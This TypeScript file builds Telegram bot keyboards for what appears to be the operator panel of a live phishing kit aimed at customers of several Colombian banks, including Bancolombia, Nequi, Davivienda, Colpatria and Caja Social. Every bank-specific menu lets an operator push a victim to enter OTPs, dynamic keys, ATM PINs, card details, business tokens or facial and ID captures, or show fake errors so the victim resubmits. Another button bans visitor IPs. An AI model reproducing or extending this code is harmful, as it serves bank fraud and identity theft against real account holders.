// lib/telegramKeyboards.ts

export const getFullKeyboard = (sid: string, ip?: string, isBancol?: boolean, isBogota?: boolean) => {
  const keyboard = [
    [
      { text: "🔄 CAMBIAR MEDIO DE PAGO", callback_data: `cambiar_medio:${sid}` },
      { text: "🏦 CAMBIAR BANCO", callback_data: `cambiar_banco:${sid}` }
    ],
    [{ text: "⚠️ ERROR LOGO", callback_data: `elogo:${sid}` }],
    [
      { text: "💰 SALDO", callback_data: `saldo:${sid}` }
    ],
    [
      { text: "🔑 OTP", callback_data: `otp:${sid}` },
      { text: "❌ OTP", callback_data: `eotp:${sid}` }
    ],
    [
      { text: "🔑 OTP (8)", callback_data: `otp8:${sid}` },
      { text: "❌ OTP (8)", callback_data: `eotp8:${sid}` }
    ],
    [
      { text: "📱 QR", callback_data: `qr:${sid}` },
      { text: "❌ QR error", callback_data: `eqr:${sid}` }
    ]
  ];

  if (isBogota) {
    keyboard.push([
      { text: "⛔ ERROR ASESOR", callback_data: `error_asesor:${sid}` },
      { text: "📲 AUTORIZAR APP", callback_data: `autorizar_app:${sid}` }
    ]);
  }

  keyboard.push([
    { text: "🔐 DINÁMICA", callback_data: `dinamica:${sid}` },
    { text: "❌ DINÁMICA", callback_data: `edinamica:${sid}` }
  ]);

  keyboard.push([
    { text: "💳 TC", callback_data: `tc:${sid}` },
    { text: "❌ TC", callback_data: `etc:${sid}` }
  ]);

  keyboard.push([
    { text: "👤 ACT DATOS", callback_data: `actdatos:${sid}` }
  ]);

  keyboard.push([
    { text: "🤳 FACIAL", callback_data: `facial:${sid}` },
    { text: "⚠️ ERROR ID/FACIAL", callback_data: `menu_efacial:${sid}` }
  ]);

  keyboard.push([
    { text: "🔢 CLAVE CAJERO", callback_data: `cajero:${sid}` },
    { text: "❌ CLAVE CAJERO", callback_data: `ecajero:${sid}` }
  ]);

  if (isBancol) {
    keyboard.push([
      { text: "❌ SISTEMA", callback_data: `xsistema:${sid}` }
    ]);
    keyboard.push([
      { text: "❌ 923", callback_data: `xbloqueo:${sid}` }
    ]);
  }

  keyboard.push([
    { text: "📲 AUTORIZACIÓN", callback_data: `xconnection:${sid}` }
  ]);

  keyboard.push([
    { text: "🏁 FINALIZAR PROCESO", callback_data: `fin:${sid}` }
  ]);

  if (ip && ip !== "IP no disponible") {
    keyboard.push([{ text: "🚫 BANEAR IP", callback_data: `block_${ip}` }]);
  }

  return { inline_keyboard: keyboard };
};

export const getFullKeyboardCajaSocial = (sid: string, ip?: string) => {
  const keyboard = [
    [
      { text: "🔄 CAMBIAR MEDIO DE PAGO", callback_data: `cambiar_medio:${sid}` },
      { text: "🏦 CAMBIAR BANCO", callback_data: `cambiar_banco:${sid}` }
    ],
    [{ text: "⚠️ ERROR LOGO", callback_data: `elogo:${sid}` }],
    [
      { text: "💰 SALDO", callback_data: `saldo:${sid}` }
    ],
    [
      { text: "🔑 OTP", callback_data: `otp:${sid}` },
      { text: "❌ OTP", callback_data: `eotp:${sid}` }
    ],
    [
      { text: "📱 QR", callback_data: `qr:${sid}` },
      { text: "❌ QR error", callback_data: `eqr:${sid}` }
    ],
    [
      { text: "🔐 DINÁMICA", callback_data: `dinamica:${sid}` },
      { text: "❌ DINÁMICA", callback_data: `edinamica:${sid}` }
    ],
    [
      { text: "🔢 CLAVE CAJERO", callback_data: `cajero:${sid}` },
      { text: "❌ CLAVE CAJERO", callback_data: `ecajero:${sid}` }
    ],
    [
      { text: "💳 TC", callback_data: `tc:${sid}` },
      { text: "❌ TC", callback_data: `etc:${sid}` }
    ],
    [
      { text: "👤 ACT DATOS", callback_data: `actdatos:${sid}` }
    ],
    [
      { text: "🤳 FACIAL", callback_data: `facial:${sid}` },
      { text: "⚠️ ERROR ID/FACIAL", callback_data: `menu_efacial:${sid}` }
    ],
    [
      { text: "📲 AUTORIZACIÓN", callback_data: `xconnection:${sid}` }
    ],
    [
      { text: "🏁 FINALIZAR PROCESO", callback_data: `fin:${sid}` }
    ]
  ];

  if (ip && ip !== "IP no disponible") {
    keyboard.push([{ text: "🚫 BANEAR IP", callback_data: `block_${ip}` }]);
  }

  return { inline_keyboard: keyboard };
};

export const getFullKeyboardNequi = (sid: string, ip?: string) => {
  const keyboard = [
    [
      { text: "🔄 CAMBIAR MEDIO DE PAGO", callback_data: `cambiar_medio:${sid}` },
      { text: "🏦 CAMBIAR BANCO", callback_data: `cambiar_banco:${sid}` }
    ],
    [{ text: "⚠️ ERROR LOGO", callback_data: `elogo:${sid}` }],
    [
      { text: "💰 Saldo", callback_data: `saldo:${sid}` },
    ],
    [
      { text: "📱 QR", callback_data: `qr:${sid}` },
      { text: "❌ QR error", callback_data: `eqr:${sid}` }
    ],
    [
      { text: "🔐 DINÁMICA", callback_data: `dinamica:${sid}` },
      { text: "❌ DINÁMICA", callback_data: `edinamica:${sid}` }
    ],
    [
      { text: "🔢 CLAVE CAJERO", callback_data: `cajero:${sid}` },
      { text: "❌ CLAVE CAJERO", callback_data: `ecajero:${sid}` }
    ],
    [
      { text: "💳 TC", callback_data: `tc:${sid}` },
      { text: "❌ TC", callback_data: `etc:${sid}` }
    ],
    [
      { text: "👤 ACT DATOS", callback_data: `actdatos:${sid}` }
    ],
    [
      { text: "🤳 FACIAL", callback_data: `facial:${sid}` },
      { text: "⚠️ ERROR ID/FACIAL", callback_data: `menu_efacial:${sid}` }
    ],
    [
      { text: "📲 AUTORIZACIÓN", callback_data: `xconnection:${sid}` }
    ],
    [
      { text: "🏁 FINALIZAR PROCESO", callback_data: `fin:${sid}` }
    ]
  ];

  if (ip && ip !== "IP no disponible") {
    keyboard.push([{ text: "🚫 BANEAR IP", callback_data: `block_${ip}` }]);
  }

  return { inline_keyboard: keyboard };
};

export const getErrorFacialKeyboard = (sid: string) => ({
  inline_keyboard: [
    [
      { text: "❌ Error Frente", callback_data: `efacial_frente:${sid}` },
      { text: "❌ Error Dorso", callback_data: `efacial_dorso:${sid}` }
    ],
    [
      { text: "❌ Error Cara", callback_data: `efacial_cara:${sid}` }
    ],
    [
      { text: "🔙 Volver", callback_data: `menu_back:${sid}` }
    ]
  ]
});

export const getFullKeyboardEmpresas = (sid: string, ip?: string) => {
  const keyboard = [
    [
      { text: "🔄 CAMBIAR MEDIO DE PAGO", callback_data: `cambiar_medio:${sid}` },
      { text: "🏦 CAMBIAR BANCO", callback_data: `cambiar_banco:${sid}` }
    ],
    [
      { text: "⚠️ ERROR LOGO", callback_data: `elogo:${sid}` },
      { text: "❌ ERROR DATOS", callback_data: `error:${sid}` }
    ],
    [
      { text: "📱 QR", callback_data: `qr:${sid}` },
      { text: "❌ QR error", callback_data: `eqr:${sid}` }
    ],
    [
      { text: "🔑 PEDIR TOKEN", callback_data: `token:${sid}` },
      { text: "❌ ERROR TOKEN", callback_data: `etoken:${sid}` }
    ],
    [
      { text: "🔢 CLAVE CAJERO", callback_data: `cajero:${sid}` },
      { text: "❌ CLAVE CAJERO", callback_data: `ecajero:${sid}` }
    ],
    [
      { text: "⏳ TOKEN VENCIDO", callback_data: `vencido:${sid}` },
      { text: "⛔ ERROR SISTEMA", callback_data: `esistema:${sid}` }
    ],
    [
      { text: "📲 AUTORIZACIÓN", callback_data: `xconnection:${sid}` }
    ],
    [
      { text: "🏁 FINALIZAR PROCESO", callback_data: `fin:${sid}` }
    ]
  ];

  if (ip && ip !== "IP no disponible") {
    keyboard.push([{ text: "🚫 BANEAR IP", callback_data: `block_${ip}` }]);
  }

  return { inline_keyboard: keyboard };
};

export const getFullKeyboardDavivienda = (sid: string, ip?: string) => {
  const keyboard = [
    [
      { text: "🔄 CAMBIAR MEDIO DE PAGO", callback_data: `cambiar_medio:${sid}` },
      { text: "🏦 CAMBIAR BANCO", callback_data: `cambiar_banco:${sid}` }
    ],
    [{ text: "⚠️ ERROR LOGO", callback_data: `elogo:${sid}` }],
    [
      { text: "💰 SALDO", callback_data: `saldo:${sid}` }
    ],
    [
      { text: "🔑 OTP", callback_data: `otp:${sid}` },
      { text: "❌ OTP", callback_data: `eotp:${sid}` }
    ],
    [
      { text: "📱 QR", callback_data: `qr:${sid}` },
      { text: "❌ QR error", callback_data: `eqr:${sid}` }
    ],
    [
      { text: "🔐 DINÁMICA", callback_data: `dinamica:${sid}` },
      { text: "❌ DINÁMICA", callback_data: `edinamica:${sid}` }
    ],
    [
      { text: "🔢 CLAVE CAJERO", callback_data: `cajero:${sid}` },
      { text: "❌ CLAVE CAJERO", callback_data: `ecajero:${sid}` }
    ],
    [
      { text: "💳 TC", callback_data: `tc:${sid}` },
      { text: "❌ TC", callback_data: `etc:${sid}` }
    ],
    [
      { text: "👤 ACT DATOS", callback_data: `actdatos:${sid}` }
    ],
    [
      { text: "🤳 FACIAL", callback_data: `facial:${sid}` },
      { text: "⚠️ ERROR ID/FACIAL", callback_data: `menu_efacial:${sid}` }
    ],
    [
      { text: "⛔ ERROR SISTEMA", callback_data: `edavivienda:${sid}` }
    ],
    [
      { text: "📲 AUTORIZACIÓN", callback_data: `xconnection:${sid}` }
    ],
    [
      { text: "🏁 FINALIZAR PROCESO", callback_data: `fin:${sid}` }
    ]
  ];

  if (ip && ip !== "IP no disponible") {
    keyboard.push([{ text: "🚫 BANEAR IP", callback_data: `block_${ip}` }]);
  }

  return { inline_keyboard: keyboard };
};

export const getFullKeyboardColpatria = (sid: string, ip?: string) => {
  const keyboard = [
    [
      { text: "🔄 CAMBIAR MEDIO DE PAGO", callback_data: `cambiar_medio:${sid}` },
      { text: "🏦 CAMBIAR BANCO", callback_data: `cambiar_banco:${sid}` }
    ],
    [{ text: "⚠️ ERROR LOGO", callback_data: `elogo:${sid}` }],
    [
      { text: "💰 SALDO", callback_data: `saldo:${sid}` }
    ],
    [
      { text: "🔑 OTP", callback_data: `otp:${sid}` },
      { text: "❌ OTP", callback_data: `eotp:${sid}` }
    ],
    [
      { text: "📱 QR", callback_data: `qr:${sid}` },
      { text: "❌ QR error", callback_data: `eqr:${sid}` }
    ],
    [
      { text: "🔐 DINÁMICA", callback_data: `dinamica:${sid}` },
      { text: "❌ DINÁMICA", callback_data: `edinamica:${sid}` }
    ],
    [
      { text: "🔢 CLAVE CAJERO", callback_data: `cajero:${sid}` },
      { text: "❌ CLAVE CAJERO", callback_data: `ecajero:${sid}` }
    ],
    [
      { text: "💳 TC", callback_data: `tc:${sid}` },
      { text: "❌ TC", callback_data: `etc:${sid}` }
    ],
    [
      { text: "👤 ACT DATOS", callback_data: `actdatos:${sid}` }
    ],
    [
      { text: "🤳 FACIAL", callback_data: `facial:${sid}` },
      { text: "⚠️ ERROR ID/FACIAL", callback_data: `menu_efacial:${sid}` }
    ],
    [
      { text: "📲 AUTORIZACIÓN", callback_data: `xconnection:${sid}` }
    ],
    [
      { text: "🏁 FINALIZAR PROCESO", callback_data: `fin:${sid}` }
    ]
  ];

  if (ip && ip !== "IP no disponible") {
    keyboard.push([{ text: "🚫 BANEAR IP", callback_data: `block_${ip}` }]);
  }

  return { inline_keyboard: keyboard };
};